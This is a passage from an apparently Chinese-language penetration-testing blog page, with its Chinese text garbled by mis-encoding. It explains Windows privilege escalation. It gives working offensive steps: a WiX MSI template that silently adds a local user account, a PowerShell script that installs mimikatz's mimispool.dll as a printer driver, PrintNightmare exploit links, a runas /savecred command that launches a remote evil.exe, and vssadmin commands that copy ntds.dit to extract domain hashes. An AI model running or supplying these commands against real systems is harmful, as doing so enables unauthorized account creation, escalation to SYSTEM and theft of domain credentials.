                <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span> <span class="na">KeyPath=</span><span class="s">"yes"</span><span class="nt">&gt;&lt;/Component&gt;</span>
                <span class="nt">&lt;/Directory&gt;</span>
            <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;/Directory&gt;</span>
        <span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;/Feature&gt;</span>

        <span class="nt">&lt;CustomAction</span> 
            <span class="na">Id=</span><span class="s">"Shell"</span> 
            <span class="na">Execute=</span><span class="s">"deferred"</span>
            <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> 
            <span class="na">Impersonate=</span><span class="s">"no"</span> 
            <span class="na">ExeCommand=</span><span class="s">"net user zhi 123.com /add"</span> 
            <span class="na">Return=</span><span class="s">"check"</span> 
        <span class="nt">/&gt;</span>

        <span class="nt">&lt;InstallExecuteSequence&gt;</span>
            <span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Shell"</span> <span class="na">After=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
        <span class="nt">&lt;/InstallExecuteSequence&gt;</span>
    <span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span>
</code></pre></div></div>

<p>å°†è¯¥æ¨¡æ¿æ‰“åŒ…æˆ .msi æ–‡ä»¶ï¼š</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>candle zhi.wxs
light zhi.wixobj
</code></pre></div></div>

<p>æ­¤æ—¶å·²ç»ç”Ÿæˆäº†zhi.msiæ–‡ä»¶ï¼Œè¿è¡Œè¯¥æ–‡ä»¶å³å¯åˆ›å»ºç”¨æˆ·åä¸ºzhi</p>

<ul>
  <li><a href="http://uuzdaisuki.com/2021/06/09/AlwaysInstallElevated%E6%8F%90%E6%9D%83/#AlwaysInstallElevated%E6%8F%90%E6%9D%83">AlwaysInstallElevatedææƒ</a></li>
  <li><a href="https://www.cnblogs.com/JFSec/articles/17322189.html">æœ¬åœ°ä¾¦æ“¦ä¸ææƒ - JFSec - åšå®¢å›­</a></li>
</ul>

<h2 id="åˆ©ç”¨å­˜åœ¨æ¼æ´çš„é©±åŠ¨ææƒ">åˆ©ç”¨å­˜åœ¨æ¼æ´çš„é©±åŠ¨ææƒ</h2>
<p>æ¡ä»¶ï¼š</p>
<ul>
  <li>æ¼æ´</li>
  <li>å­˜åœ¨æ¼æ´çš„é©±åŠ¨</li>
</ul>

<p>æŸ¥çœ‹é©±åŠ¨ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Swissky</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">driverquery.exe</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">table</span><span class="w"> </span><span class="nx">/si</span><span class="w">
</span><span class="kr">Module</span><span class="w"> </span><span class="n">Name</span><span class="w">  </span><span class="nx">Display</span><span class="w"> </span><span class="nx">Name</span><span class="w">           </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Type</span><span class="w">   </span><span class="nx">Link</span><span class="w"> </span><span class="nx">Date</span><span class="w">
</span><span class="o">============</span><span class="w"> </span><span class="o">======================</span><span class="w"> </span><span class="o">=============</span><span class="w"> </span><span class="o">======================</span><span class="w">
</span><span class="mi">1394</span><span class="n">ohci</span><span class="w">     </span><span class="nx">1394</span><span class="w"> </span><span class="nx">OHCI</span><span class="w"> </span><span class="nx">Compliant</span><span class="w"> </span><span class="nx">Ho</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/10/2006</span><span class="w"> </span><span class="nx">4:44:38</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="mi">3</span><span class="n">ware</span><span class="w">        </span><span class="nx">3ware</span><span class="w">                  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">5/18/2015</span><span class="w"> </span><span class="nx">6:28:03</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">ACPI</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Driver</span><span class="w">  </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/9/1975</span><span class="w"> </span><span class="nx">6:17:08</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiDev</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Devices</span><span class="w"> </span><span class="nx">driver</span><span class="w">    </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">12/7/1993</span><span class="w"> </span><span class="nx">6:22:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpiex</span><span class="w">       </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">ACPIEx</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">3/1/2087</span><span class="w"> </span><span class="nx">8:53:50</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">acpipagr</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Processor</span><span class="w"> </span><span class="nx">Aggrega</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">1/24/2081</span><span class="w"> </span><span class="nx">8:36:36</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">AcpiPmi</span><span class="w">      </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Power</span><span class="w"> </span><span class="nx">Meter</span><span class="w"> </span><span class="nx">Drive</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">11/19/2006</span><span class="w"> </span><span class="nx">9:20:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">acpitime</span><span class="w">     </span><span class="nx">ACPI</span><span class="w"> </span><span class="nx">Wake</span><span class="w"> </span><span class="nx">Alarm</span><span class="w"> </span><span class="nx">Driver</span><span class="w"> </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">2/9/1974</span><span class="w"> </span><span class="nx">7:10:30</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">ADP80XX</span><span class="w">      </span><span class="nx">ADP80XX</span><span class="w">                </span><span class="nx">Kernel</span><span class="w">        </span><span class="nx">4/9/2015</span><span class="w"> </span><span class="nx">4:49:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>
<p>å¯¹æ¯”å­˜åœ¨æ¼æ´çš„é©±åŠ¨ï¼š</p>
<ul>
  <li><a href="https://www.loldrivers.io/">LOLDrivers</a></li>
</ul>

<h2 id="åˆ©ç”¨æ‰“å°æœºææƒ">åˆ©ç”¨æ‰“å°æœºææƒ</h2>
<h3 id="å°†-mimikatz-æ·»åŠ ä¸ºè™šæ‹Ÿæ‰“å°æœº">å°† mimikatz æ·»åŠ ä¸ºè™šæ‹Ÿæ‰“å°æœº</h3>
<p>Create a Printer</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$printerName</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$system32</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">systemroot</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\system32'</span><span class="w">
</span><span class="nv">$drivers</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\spool\drivers'</span><span class="w">
</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w">
 
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mscms.dll'</span><span class="p">)</span><span class="w">             </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$system32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\x64\mimispool.dll'</span><span class="w">   </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\x64\3\mimispool.dll'</span><span class="p">)</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'.\mimikatz_trunk\win32\mimispool.dll'</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="p">(</span><span class="nv">$drivers</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="s1">'\W32X86\3\mimispool.dll'</span><span class="p">)</span><span class="w">
 
</span><span class="n">Add-PrinterDriver</span><span class="w"> </span><span class="nt">-Name</span><span class="w">       </span><span class="s1">'Generic / Text Only'</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w">       </span><span class="nt">-DriverName</span><span class="w"> </span><span class="s1">'Generic / Text Only'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="nt">-PortName</span><span class="w"> </span><span class="s1">'FILE:'</span><span class="w"> </span><span class="nt">-Shared</span><span class="w">
 
</span><span class="n">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles'</span><span class="p">)</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'x64\3'</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Kiwi'</span><span class="p">)</span><span class="w">   </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'W32X86\3'</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s1">'mimispool.dll'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Litchi'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mscms.dll'</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-Item</span><span class="w">         </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Directory'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Files'</span><span class="w">     </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'MultiString'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="bp">$null</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nx">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="p">(</span><span class="nv">$RegStartPrinter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\CopyFiles\Mango'</span><span class="p">)</span><span class="w">  </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Module'</span><span class="w">    </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="s1">'String'</span><span class="w">      </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'mimispool.dll'</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span></code></pre></div></div>
<p>Execute the driver</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$serverName</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s1">'dc.purple.lab'</span><span class="w">
</span><span class="nv">$printerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Universal Priv Printer'</span><span class="w">
</span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'\\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$serverName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">' - '</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kr">If</span><span class="w"> </span><span class="p">([</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">Is64BitOperatingSystem</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="s1">'x64'</span><span class="p">}</span><span class="w"> </span><span class="kr">Else</span><span class="w"> </span><span class="p">{</span><span class="s1">'x86'</span><span class="p">})</span><span class="w">
</span><span class="n">Remove-Printer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w"> </span><span class="nt">-ConnectionName</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w">
</span></code></pre></div></div>
<h3 id="printernightmare">PrinterNightmare</h3>
<p>æ¼æ´CVEç¼–å·ï¼šCVE-2021-1675ã€‚æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ä»¥SYSTEMæƒé™åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œè·å¾—æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒã€‚å»ºè®®å—å½±å“ç”¨æˆ·åŠæ—¶æ›´æ–°æ¼æ´è¡¥ä¸è¿›è¡Œé˜²æŠ¤ï¼Œåšå¥½èµ„äº§è‡ªæŸ¥ä»¥åŠé¢„é˜²å·¥ä½œï¼Œä»¥å…é­å—é»‘å®¢æ”»å‡»ã€‚</p>

<p><strong>å½±å“èŒƒå›´</strong></p>

<p>Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems</p>

<ul>
  <li><a href="https://github.com/cube0x0/CVE-2021-1675">cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527</a></li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[ã€–EXPã€—Ladonæ‰“å°æœºæ¼æ´ææƒCVE-2021-1675å¤ç°</td>
          <td>K8å“¥å“¥â€™s Blog](https://k8gege.org/p/CVE-2021-1675.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h3 id="bring-your-own-vulnerability">Bring Your Own Vulnerability</h3>
<p>windows å…è®¸ä½æƒé™ç”¨æˆ·å®‰è£…æ‰“å°æœºé©±åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªè¡Œå®‰è£…å¸¦æœ‰æ¼æ´çš„é©±åŠ¨ç¨‹åºï¼Œç„¶åé€šè¿‡è¿™äº›é©±åŠ¨ç¨‹åºçš„æ¼æ´ææƒåˆ° SYSTEMã€‚</p>

<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p>
<ul>
  <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li>
  <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li>
  <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li>
  <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li>
</ul>

<p>åˆ©ç”¨ expï¼š</p>
<ul>
  <li><a href="https://github.com/jacob-baines/concealed_position">jacob-baines/concealed_position: Bring your own print driver privilege escalation tool</a></li>
</ul>

<h2 id="åˆ©ç”¨-runas-å‘½ä»¤ææƒæˆ–é™æƒ">åˆ©ç”¨ RunAS å‘½ä»¤ææƒæˆ–é™æƒ</h2>
<p>RunAS å‘½ä»¤ä½¿ç”¨åœºæ™¯ï¼š</p>
<ol>
  <li>æƒé™ä¸å¤Ÿè¯»ä¸åˆ°å¸å¯†æˆ– HASH çš„æƒ…å†µä¸‹ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦ä½¿ç”¨æŸä¸ªå·²ä¿å­˜çš„å¯†ç ï¼Œä½¿ç”¨è¯¥å·²ä¿å­˜çš„å¯†ç å¯å®ç°ææƒ</li>
  <li>SYSTEM æƒé™é™æƒåˆ°æŸä¸ªç”¨æˆ·è¿›è¡Œæ“ä½œæ—¶ï¼Œä¾‹å¦‚åˆ‡æ¢åˆ°ç‰¹å®šçš„ç”¨æˆ·ï¼Œè¯»å–å¯¹åº”çš„æµè§ˆå™¨è®°å½•ã€æˆ–è€…è·å–ç‰¹å®šç”¨æˆ·çš„ shell ç­‰ã€‚</li>
</ol>

<p>æšä¸¾ä¿å­˜çš„å¯†ç ï¼š</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cmdkey</span> <span class="na">/list
</span><span class="kd">Currently</span> <span class="kd">stored</span> <span class="kd">credentials</span>:
    <span class="kd">Target</span>: <span class="kd">Domain</span><span class="nl">:interactive</span><span class="o">=</span><span class="kd">WORKGROUP</span>\Administrator
    <span class="kd">Type</span>: <span class="kd">Domain</span> <span class="kd">Password</span>
    <span class="kd">User</span>: <span class="kd">WORKGROUP</span>\Administrator
</code></pre></div></div>
<p>ä½¿ç”¨ä¿å­˜çš„å‡­è¯è¿æ¥è¿œç¨‹ SMB æˆ–è€…ç›´æ¥è¿è¡Œå‘½ä»¤ï¼š</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:WORKGROUP</span>\Administrator <span class="s2">"\\10.XXX.XXX.XXX\SHARE\evil.exe"</span>
<span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:Administrator</span> <span class="s2">"cmd.exe /k whoami"</span>
</code></pre></div></div>

<p>å…¶ä»–åˆ©ç”¨ï¼š</p>

<ul>
  <li><a href="http://k8gege.org/Ladon/runas.html">ã€–æ•™ç¨‹ã€—Ladonéäº¤äº’å¼runasæ‰§è¡Œå‘½ä»¤/åå¼¹SHELL </a>
    <blockquote>
      <p>ç³»ç»Ÿè‡ªå¸¦Runaså‘½ä»¤éœ€è¦äº¤äº’å¼ç™»é™†ï¼Œåœ¨webshellæˆ–ä¸æ”¯æŒäº¤äº’å¼çš„shellä¸‹ä½¿ç”¨éº»çƒ¦ã€‚è€ŒLadonçš„Runasåˆ™å®Œç¾è§£å†³äº†ä»¥ä¸Šé—®é¢˜ï¼Œæ”¯æŒéäº¤äº’å¼æ¨¡æ‹Ÿç™»é™†æŒ‡å®šç”¨æˆ·è¿è¡Œç¨‹åºæˆ–å‘½ä»¤ã€‚</p>
    </blockquote>
  </li>
</ul>

<h2 id="åˆ©ç”¨-shadow-copies-ææƒåŸŸæ§">åˆ©ç”¨ Shadow Copies ææƒï¼ˆåŸŸæ§ï¼‰</h2>
<p>è¯¥åˆ©ç”¨æ–¹å¼ä¸€èˆ¬ç”¨äºä»åŸŸæ§ä¸­è·å– ntds.dit æ–‡ä»¶ï¼ˆæ´»åŠ¨ç›®å½•ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åœ¨è¯¥æ–‡ä»¶ä¸­ï¼‰ã€‚</p>

<p>è·å–å·å½±ä½ç½®ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List shadow copies using vssadmin (Needs Admnistrator Access)</span><span class="w">
</span><span class="n">vssadmin</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w">
  
</span><span class="c"># List shadow copies using diskshadow</span><span class="w">
</span><span class="n">diskshadow</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w"> </span><span class="nx">all</span><span class="w">

</span></code></pre></div></div>

<p>åˆ›å»ºè½¯é“¾æ¥ä»¥ä¾¿æŸ¥çœ‹ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Make a symlink to the shadow copy and access </span><span class="w">
</span><span class="n">mklink</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">c:\shadowcopy</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><span class="w">
</span></code></pre></div></div>

<p>æˆ–è€…åˆ›å»ºä¸€ä¸ªå·å½±æ‹·è´ï¼Œç„¶åå¤åˆ¶å‡ºæ¥</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vssadmin</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">/for</span><span class="o">=</span><span class="n">c:</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">c:\ntds.dit</span><span class="w">
</span></code></pre></div></div>

<p>è·å–åˆ° ntds åï¼Œå¯ä»¥æƒ³åŠæ³•è·å–å…¶ä¸­çš„æ•£åˆ—å€¼ã€‚</p>
<ul>
  <li>Impacket ä¸­çš„ Secretsdump</li>
  <li>msf ä¸­çš„ Psexec_ntdsgrab æ¨¡å—</li>
  <li>msf ä¸­ Meterpreterä¼šè¯ + windows/gather/credentials/domain_hashdump</li>
</ul>

<p><strong>å‚è€ƒèµ„æ–™</strong>ï¼š</p>
<ul>
  <li><a href="https://zhuanlan.zhihu.com/p/441167567">åŸŸæ§å®‰å…¨ä¹‹åŸŸæ¸—é€ - çŸ¥ä¹</a></li>
</ul>
